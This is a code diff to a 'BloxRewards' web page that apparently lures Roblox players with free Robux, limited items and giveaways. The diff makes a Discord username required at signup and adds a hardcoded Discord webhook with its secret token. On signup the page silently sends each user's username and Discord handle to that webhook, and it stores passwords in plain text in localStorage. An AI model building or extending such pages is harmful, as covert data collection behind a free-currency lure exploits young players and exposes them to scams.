@@ -43,6 +43,8 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 .warning-box p,.info-box p,.rewards-box p{font-size:1.08rem;line-height:1.75;margin:1.1rem 0}
 .discord-btn{display:block;width:260px;margin:4rem auto;cursor:pointer;transition:all .4s;border-radius:20px;overflow:hidden;box-shadow:0 14px 40px rgba(0,0,0,.45)}
 .discord-btn:hover{transform:scale(1.1);box-shadow:0 24px 60px rgba(155,76,255,.45)}
+.chat-area{background:rgba(40,30,60,.3);border:1px solid rgba(180,120,255,.15);border-radius:20px;padding:24px;max-width:900px;margin:3rem auto;min-height:300px}
+.chat-area p{text-align:center;opacity:.8;padding:2rem}
 .footer{text-align:center;padding:120px 20px 160px;font-size:.95rem;opacity:.55}
 .snowflake{position:fixed;top:-20px;width:7px;height:7px;background:#fff;border-radius:50%;pointer-events:none;z-index:0;opacity:.7;animation:snowfall linear infinite}
 @keyframes snowfall{0%{transform:translateY(-20px) translateX(0) rotate(0deg)}100%{transform:translateY(110vh) translateX(40px) rotate(360deg)}}
@@ -55,7 +57,7 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 <span onclick="navigate('home')">Home</span>
 <span onclick="navigate('robux')">Robux</span>
 <span onclick="navigate('rewards')">Rewards</span>
-<span onclick="navigate('fun')">Fun Stuff</span>
+<span onclick="navigate('fun')">Community</span>
 <span onclick="navigate('profile')">My Profile</span>
 <span onclick="navigate('auth')">Login</span>
 </div>
@@ -71,7 +73,7 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 <h3>Stay safe out there</h3>
 <p>We never ask for your Roblox username or password. Never.</p>
 <p>If anyone asks for your login info just tell them no. Its a scam attempt.</p>
-<p>We hate scammers and we report them every time we spot one. This is the only real BloxRewards site. Come hang out in our Discord for updates and to chat: <a href="https://discord.gg/rBP7d9Vyrz" target="_blank" style="color:#c89eff;">discord.gg/rBP7d9Vyrz</a></p>
+<p>We hate scammers and we report them every time we spot one. This is the only real BloxRewards site.</p>
 </div>
 
 <img src="https://files.catbox.moe/gnpy3a.png" alt="Join Discord" class="discord-btn" onclick="window.open('https://discord.gg/rBP7d9Vyrz','_blank')">
@@ -98,7 +100,7 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 <h3>Rewards & Points Shop</h3>
 <p>Earn points by being active in our Discord server chatting hanging out inviting friends or just using the site a lot.</p>
 <p>Points unlock cool stuff including some classic limiteds. The more active you are the faster you earn.</p>
-<p>Top earners get extra bonuses like monthly Robux drops referral cuts and early access to new giveaways.</p>
+<p>Top earners get extra bonuses like monthly Robux drops and early access to new giveaways.</p>
 <p>We run real giveaways for limiteds UGCs and accessories straight in Discord. Join to enter and see winners announced live.</p>
 </div>
 
@@ -107,37 +109,41 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 
 <div id="fun" class="page">
 <div class="rewards-box">
-<h3>Fun Things to Do</h3>
-<p>As a guest you can look around browse the home page see the rewards shop and join our Discord to chat or enter giveaways.</p>
-<p>But to do the real stuff like transfer Robux claim rewards from the shop post in our media channel or join private events you need to make a quick account. Its free and takes 10 seconds.</p>
-<p>Logged in members get way more to play with including:</p>
+<h3>Community Features</h3>
+<p>As a guest you can browse the site join our Discord and look at rewards.</p>
+<p>To chat with other users post in media channel enter raffles claim items or transfer Robux you need an account. Its quick and links to your Discord so we can track activity and give points for chatting.</p>
+<p>The more you chat the more points you earn automatically.</p>
 </div>
 
 <div class="fun-grid">
 <div class="fun-card">
-<h4>Media Channel</h4>
-<p>Share your Roblox screenshots memes funny clips or anything cool you made. Everyone sees it and we sometimes feature the best ones with bonus points.</p>
+<h4>Member Chat</h4>
+<p>Logged in users can talk directly here with others share tips discuss games or just hang out.</p>
 </div>
 <div class="fun-card">
-<h4>Daily Login Bonus</h4>
-<p>Come back every day to claim free points. The streak gets bigger rewards the longer you keep it going.</p>
+<h4>Media Sharing</h4>
+<p>Post your Roblox screenshots funny clips or creations. Best ones get featured and bonus points.</p>
 </div>
 <div class="fun-card">
-<h4>Quick Quests</h4>
-<p>Simple tasks like join a game with friends react to 10 messages or invite someone new. Finish them for instant points.</p>
+<h4>Daily Login Rewards</h4>
+<p>Log in every day for free points. Longer streaks give bigger rewards.</p>
 </div>
 <div class="fun-card">
-<h4>Robux Raffles</h4>
-<p>Enter free raffles every week just by being logged in and active. Winners get Robux straight to their account.</p>
+<h4>Weekly Raffles</h4>
+<p>Automatic entry when logged in and active. Win Robux or limiteds each week.</p>
 </div>
 <div class="fun-card">
-<h4>Leaderboard Battles</h4>
-<p>Compete on the monthly leaderboard for most points or most transfers. Top spots get huge rewards and bragging rights.</p>
+<h4>Activity Leaderboard</h4>
+<p>See whos most active and earn extra points for top spots every month.</p>
 </div>
 <div class="fun-card">
-<h4>Custom Avatars</h4>
-<p>Unlock special profile badges and colors the more points and activity you have.</p>
+<h4>Simple Quests</h4>
+<p>Easy tasks like share a screenshot or invite a friend for instant points.</p>
 </div>
+</div>
+
+<div class="chat-area">
+<p>Chat is only available for logged in members. Sign in to join the conversation.</p>
 </div>
 </div>
 
@@ -146,6 +152,7 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
 <h2 id="authTitle">Login</h2>
 <input id="authUser" placeholder="Username">
 <input id="authPass" type="password" placeholder="Password">
+<input id="authDiscord" placeholder="Discord Username#0000" style="display:none">
 <input id="authEmail" placeholder="Email (optional)" style="display:none">
 
 <div id="termsLabel" class="checkbox-container" style="display:none">
@@ -184,6 +191,8 @@ let currentUser=null
 let mode="login"
 let userPoints=0
 
+const webhook="https://discord.com/api/webhooks/1478939104266682379/IebkvFHpeccFN6-PNVoCCgBMZ7heW9ljO9dGg4k9rn2elcbGQENSMGp9LUiOpV3wiUJx"
+
 const shopItems=[
 {id:1,name:"Valkyrie Helm",icon:"https://files.catbox.moe/mbqcon.jpeg",points:25000,stock:3},
 {id:2,name:"Poisoned Horns of the Toxic Wasteland",icon:"https://files.catbox.moe/4uh9ow.jpeg",points:18000,stock:5},
@@ -192,7 +201,7 @@ const shopItems=[
 ]
 
 function navigate(page){
-if((page==="robux"||page==="profile"||page==="rewards")&&!currentUser&&page!=="home")page="auth"
+if((page==="robux"||page==="profile"||page==="rewards"||page==="fun")&&!currentUser&&page!=="home")page="auth"
 document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"))
 document.getElementById(page).classList.add("active")
 if(page==="robux")renderRobuxPage()
@@ -200,7 +209,7 @@ if(page==="rewards")renderShop()
 if(page==="profile"&&currentUser){
 let users=JSON.parse(localStorage.getItem("users")||"{}")
 let data=users[currentUser]
-document.getElementById("profileDetails").innerText=`Username: ${currentUser}${data.email?`\nEmail: ${data.email}`:""}`
+document.getElementById("profileDetails").innerText=`Username: ${currentUser}${data.email?`\nEmail: ${data.email}`:""}${data.discord?`\nDiscord: ${data.discord}`:""}`
 document.getElementById("pointsDisplay").innerText=userPoints
 }
 }
@@ -248,6 +257,7 @@ function toggleMode(){
 mode=mode==="login"?"signup":"login"
 document.getElementById("authTitle").innerText=mode==="login"?"Login":"Create Account"
 document.getElementById("authEmail").style.display=mode==="signup"?"block":"none"
+document.getElementById("authDiscord").style.display=mode==="signup"?"block":"none"
 document.getElementById("termsLabel").style.display=mode==="signup"?"flex":"none"
 updateButtonState()
 }
@@ -256,22 +266,26 @@ function updateButtonState(){
 let btn=document.getElementById("authButton")
 let u=document.getElementById("authUser").value.trim()
 let p=document.getElementById("authPass").value
+let d=document.getElementById("authDiscord").value.trim()
 let terms=document.getElementById("termsAgree")?.checked??true
-btn.disabled=mode==="signup"?! (u&&p&&terms):!(u&&p)
+btn.disabled=mode==="signup"?! (u&&p&&d&&terms):!(u&&p)
 }
 
 function submitAuth(){
 let u=document.getElementById("authUser").value.trim()
 let p=document.getElementById("authPass").value
 let e=document.getElementById("authEmail").value.trim()
+let d=document.getElementById("authDiscord").value.trim()
 if(!u||!p)return
 let users=JSON.parse(localStorage.getItem("users")||"{}")
 if(mode==="signup"){
 if(users[u]){alert("Username already taken");return}
-users[u]={password:p,email:e||null,permission:document.getElementById("emailPermission").checked,points:0}
+if(!d){alert("Please enter your Discord username");return}
+users[u]={password:p,email:e||null,discord:d,permission:document.getElementById("emailPermission").checked,points:0}
 localStorage.setItem("users",JSON.stringify(users))
 currentUser=u
 userPoints=0
+fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`New signup: ${u} | Discord: ${d}`})})
 }else{
 if(!users[u]||users[u].password!==p){alert("Wrong username or password");return}
 currentUser=u
@@ -311,6 +325,7 @@ document.body.appendChild(s)
 
 document.getElementById("authUser").addEventListener("input",updateButtonState)
 document.getElementById("authPass").addEventListener("input",updateButtonState)
+document.getElementById("authDiscord").addEventListener("input",updateButtonState)
 document.getElementById("termsAgree")?.addEventListener("change",updateButtonState)
 </script>
 </body>
